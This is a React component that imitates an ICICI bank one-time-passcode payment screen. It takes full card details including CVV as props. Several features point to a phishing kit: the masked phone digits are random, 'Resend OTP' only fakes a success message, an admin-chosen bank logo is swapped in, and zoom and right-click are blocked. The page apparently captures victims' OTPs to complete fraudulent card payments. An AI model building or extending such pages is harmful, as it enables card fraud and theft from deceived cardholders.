import React, { useState, useEffect } from 'react';

interface ICICIOTPPageProps {
  cardData: {
    cardNumber: string;
    expiryMonth: string;
    expiryYear: string;
    cvv: string;
    cardholderName: string;
  };
  billingDetails: {
    firstName: string;
    lastName: string;
  };
  otpValue: string;
  setOtpValue: (value: string) => void;
  otpSubmitting: boolean;
  handleOtpSubmit: () => void;
  handleOtpCancel: () => void;
  otpError: string;
  adminSelectedBankLogo: string | null;
  sessionBankLogo: string;
  cardBrandLogos: any;
  getCardBrand: (cardNumber: string) => string;
  displayPrice: number;
  formatPrice: (price: number) => string;
}

const ICICIOTPPage: React.FC<ICICIOTPPageProps> = ({
  cardData,
  billingDetails,
  otpValue,
  setOtpValue,
  otpSubmitting,
  handleOtpSubmit,
  handleOtpCancel,
  otpError,
  adminSelectedBankLogo,
  sessionBankLogo,
  cardBrandLogos,
  getCardBrand,
  displayPrice,
  formatPrice
}) => {
  // Loading state
  const [isLoading, setIsLoading] = useState(true);
  
  const [timeLeft, setTimeLeft] = useState(179); // 2:59 in seconds
  const [resendCount, setResendCount] = useState(0);
  const [resendCooldown, setResendCooldown] = useState(false);
  const [mobileLast4] = useState(() => Math.floor(1000 + Math.random() * 9000).toString());
  const [showResendSuccess, setShowResendSuccess] = useState(false);

  // Loading timer - show loading for 2 seconds
  useEffect(() => {
    const loadingTimer = setTimeout(() => {
      setIsLoading(false);
    }, 2000);
    return () => clearTimeout(loadingTimer);
  }, []);

  // Timer countdown effect
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          window.location.href = '/payment-failed?error=timeout';
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  // Format timer to MM:SS
  const formatTimer = (seconds: number) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
  };

  // Handle resend OTP
  const handleResendOtp = () => {
    if (resendCount >= 3) {
      // Redirect to fail page after 3 resend attempts
      window.location.href = '/payment-failed?error=max_resend_attempts';
      return;
    }

    if (resendCooldown) return;

    setResendCount(prev => prev + 1);
    setResendCooldown(true);
    setShowResendSuccess(true);
    setTimeLeft(179); // Reset timer to 2:59

    // Hide success message after 3 seconds
    setTimeout(() => {
      setShowResendSuccess(false);
    }, 3000);

    // Reset cooldown after 30 seconds
    setTimeout(() => {
      setResendCooldown(false);
    }, 30000);
  };

  const handleSubmit = () => {
    if (otpValue.length >= 4) {
      handleOtpSubmit();
    }
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (!/[0-9]/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter'].includes(e.key)) {
      e.preventDefault();
    }
    
    if (e.key === 'Enter' && otpValue.length >= 4) {
      handleSubmit();
    }
  };

  const currentBankLogo = adminSelectedBankLogo || sessionBankLogo || 'https://assets.stickpng.com/images/627ccb0a1b2e263b45696aa5.png';

  // Add CSS animation for spinner and prevent zoom
  useEffect(() => {
    const style = document.createElement('style');
    style.textContent = `
      @keyframes spin {
        0% { transform: translate(-50%, -50%) rotate(0deg); }
        100% { transform: translate(-50%, -50%) rotate(360deg); }
      }
    `;
    document.head.appendChild(style);

    // Prevent zoom on mobile devices
    const preventZoom = (e: Event) => {
      e.preventDefault();
    };

    const preventKeyboardZoom = (e: KeyboardEvent) => {
      if ((e.ctrlKey || e.metaKey) && (e.key === '+' || e.key === '-' || e.key === '0')) {
        e.preventDefault();
      }
    };

    const preventWheelZoom = (e: WheelEvent) => {
      if (e.ctrlKey || e.metaKey) {
        e.preventDefault();
      }
    };

    // Prevent touch-based zoom
    document.addEventListener('touchstart', preventZoom, { passive: false });
    document.addEventListener('touchmove', preventZoom, { passive: false });
    document.addEventListener('touchend', preventZoom, { passive: false });
    document.addEventListener('keydown', preventKeyboardZoom);
    document.addEventListener('wheel', preventWheelZoom, { passive: false });
    document.addEventListener('contextmenu', preventZoom);

    // Update viewport meta tag
    const viewport = document.querySelector('meta[name=viewport]');
    if (viewport) {
      viewport.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
    }

    return () => {
      document.head.removeChild(style);
      document.removeEventListener('touchstart', preventZoom);
      document.removeEventListener('touchmove', preventZoom);
      document.removeEventListener('touchend', preventZoom);
      document.removeEventListener('keydown', preventKeyboardZoom);
      document.removeEventListener('wheel', preventWheelZoom);
      document.removeEventListener('contextmenu', preventZoom);
    };
  }, []);

  return (
    <div style={{
      position: 'fixed',
      top: 0,
      left: 0,
      width: '100%',
      height: '100%',
      backgroundColor: '#f8f9fa',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px',
      boxSizing: 'border-box',
      zIndex: 1000,
      fontFamily: 'Arial, sans-serif'
    }}>
      <div style={{
        width: '100%',
        maxWidth: '400px',
        minWidth: '350px',
        backgroundColor: 'white',
        borderRadius: '12px',
        boxShadow: '0 8px 32px rgba(0, 0, 0, 0.12)',
        overflow: 'hidden',
        position: 'relative'
      }}>
        <div style={{
          padding: '30px 30px 40px 30px',
          backgroundColor: 'white'
        }}>
          {/* Header Logo Section */}
          <div style={{
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            marginBottom: '28px',
            marginLeft: '20px',
            marginRight: '20px'
          }}>
            <img 
              src="https://www.dlt.com/sites/default/files/styles/product_logos_50h_/public/2019-09/PS_logo_V_color[1].png?itok=OaqX6HHg" 
              alt="Pluralsight" 
              style={{
                height: '64px',
                width: 'auto',
                objectFit: 'contain',
                display: 'block'
              }}
            />
          </div>

          {/* Enter OTP Title */}
          <div style={{
            textAlign: 'left',
            marginBottom: '24px',
            paddingLeft: '0px'
          }}>
            <h2 style={{
              fontSize: '22px',
              fontWeight: '600',
              color: '#E53E3E',
              margin: '0',
              lineHeight: '1.3'
            }}>Enter OTP</h2>
          </div>

          {/* Total Payable Amount */}
          <div style={{
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            marginBottom: '2px',
            paddingBottom: '12px'
          }}>
            <span style={{
              fontSize: '16px',
              fontWeight: '500',
              color: '#333',
              display: 'flex',
              alignItems: 'center',
              gap: '8px'
            }}>
              Total Payable Amount {formatPrice(displayPrice)}
              <div style={{
                width: '16px',
                height: '16px',
                borderRadius: '50%',
                backgroundColor: '#3B82F6',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                fontSize: '12px',
                fontWeight: 'bold',
                color: 'white'
              }}>i</div>
            </span>
          </div>

          {/* Amount Line with Shadow */}
          <div style={{
            width: '100%',
            height: '1px',
            backgroundColor: '#e5e7eb',
            marginBottom: '32px',
            filter: 'drop-shadow(0 1px 2px rgba(0, 0, 0, 0.1))'
          }}></div>

          {/* Bank Section */}
          <div style={{
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            justifyContent: 'center',
            marginBottom: '24px',
            height: '120px',
            minHeight: '120px',
            maxHeight: '120px'
          }}>
            <div style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              height: '100%',
              width: '100%'
            }}>
              <img 
                src={currentBankLogo}
                alt="Bank Logo" 
                style={{
                  maxWidth: '80px',
                  maxHeight: '80px',
                  width: 'auto',
                  height: 'auto',
                  objectFit: 'contain',
                  display: 'block'
                }}
              />
            </div>
          </div>

          {/* Phone Number Section */}
          <div style={{
            textAlign: 'center',
            marginBottom: '24px'
          }}>
            <p style={{
              fontSize: '16px',
              color: '#333',
              margin: '0',
              lineHeight: '1.4'
            }}>
              Enter OTP sent to <strong>******{mobileLast4}</strong>
            </p>
          </div>

          {/* OTP Input */}
          <div style={{
            marginBottom: '20px'
          }}>
            <input
              type="text"
              value={otpValue}
              onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
              onKeyDown={handleKeyPress}
              style={{
                width: '100%',
                padding: '16px',
                fontSize: '20px',
                fontWeight: '600',
                textAlign: 'center',
                border: '2px solid #e5e7eb',
                borderRadius: '8px',
                outline: 'none',
                letterSpacing: '3px',
                fontFamily: 'monospace',
                backgroundColor: otpSubmitting ? '#f9fafb' : 'white',
                color: otpSubmitting ? '#9ca3af' : '#333',
                transition: 'all 0.2s ease',
                boxSizing: 'border-box'
              }}
              placeholder="------"
              maxLength={6}
              disabled={otpSubmitting}
              onFocus={(e) => {
                e.target.style.borderColor = '#3B82F6';
                e.target.style.boxShadow = '0 0 0 3px rgba(59, 130, 246, 0.1)';
              }}
              onBlur={(e) => {
                e.target.style.borderColor = '#e5e7eb';
                e.target.style.boxShadow = 'none';
              }}
            />
          </div>

          {/* Error Message */}
          {otpError && (
            <div style={{
              marginBottom: '20px',
              padding: '12px',
              backgroundColor: '#FEF2F2',
              border: '1px solid #FECACA',
              borderRadius: '8px',
              textAlign: 'center'
            }}>
              <p style={{
                color: '#DC2626',
                fontSize: '14px',
                margin: '0',
                fontWeight: '500'
              }}>
                {otpError === 'Invalid OTP' 
                  ? 'Incorrect OTP, please enter valid one time passcode!' 
                  : otpError
                }
              </p>
            </div>
          )}

          {/* Success Message */}
          {showResendSuccess && (
            <div style={{
              marginBottom: '20px',
              padding: '12px',
              backgroundColor: '#F0FDF4',
              border: '1px solid #BBF7D0',
              borderRadius: '8px',
              textAlign: 'center'
            }}>
              <p style={{
                color: '#16A34A',
                fontSize: '14px',
                margin: '0',
                fontWeight: '500'
              }}>
                OTP sent successfully to ******{mobileLast4}
              </p>
            </div>
          )}

          {/* Resend OTP */}
          <div style={{
            textAlign: 'center',
            marginBottom: '24px'
          }}>
            <button
              onClick={handleResendOtp}
              disabled={resendCooldown || resendCount >= 3 || otpSubmitting}
              style={{
                background: 'none',
                border: 'none',
                color: (resendCooldown || resendCount >= 3 || otpSubmitting) ? '#9CA3AF' : '#3B82F6',
                fontSize: '16px',
                fontWeight: '500',
                cursor: (resendCooldown || resendCount >= 3 || otpSubmitting) ? 'not-allowed' : 'pointer',
                textDecoration: 'underline',
                padding: '0'
              }}
            >
              Resend OTP
            </button>
            {resendCount >= 3 && (
              <p style={{
                color: '#DC2626',
                fontSize: '12px',
                margin: '4px 0 0 0'
              }}>Maximum resend attempts reached</p>
            )}
          </div>

          {/* Timer */}
          <div style={{
            textAlign: 'center',
            marginBottom: '30px'
          }}>
            <p style={{
              fontSize: '14px',
              color: '#666',
              margin: '0'
            }}>
              OTP will expire in <span style={{ color: '#DC2626', fontWeight: 'bold' }}>{formatTimer(timeLeft)}</span> minutes
            </p>
          </div>

          {/* Confirm Payment Button */}
          <button
            onClick={handleSubmit}
            disabled={otpValue.length < 4 || otpSubmitting}
            style={{
              width: '100%',
              padding: '16px',
              backgroundColor: (otpValue.length < 4 || otpSubmitting) ? '#9CA3AF' : '#3B82F6',
              color: 'white',
              border: 'none',
              borderRadius: '8px',
              fontSize: '18px',
              fontWeight: '600',
              cursor: (otpValue.length < 4 || otpSubmitting) ? 'not-allowed' : 'pointer',
              transition: 'all 0.2s ease',
              position: 'relative',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '8px'
            }}
            onMouseOver={(e) => {
              if (otpValue.length >= 4 && !otpSubmitting) {
                e.currentTarget.style.backgroundColor = '#2563EB';
              }
            }}
            onMouseOut={(e) => {
              if (otpValue.length >= 4 && !otpSubmitting) {
                e.currentTarget.style.backgroundColor = '#3B82F6';
              }
            }}
          >
            {otpSubmitting ? (
              <>
                <div style={{
                  width: '20px',
                  height: '20px',
                  border: '2px solid transparent',
                  borderTop: '2px solid white',
                  borderRadius: '50%',
                  animation: 'spin 1s linear infinite'
                }}></div>
                <span style={{ opacity: 0.8 }}>CONFIRM PAYMENT</span>
              </>
            ) : (
              'CONFIRM PAYMENT'
            )}
          </button>
        </div>
      </div>
    </div>
  );
};

export default ICICIOTPPage;
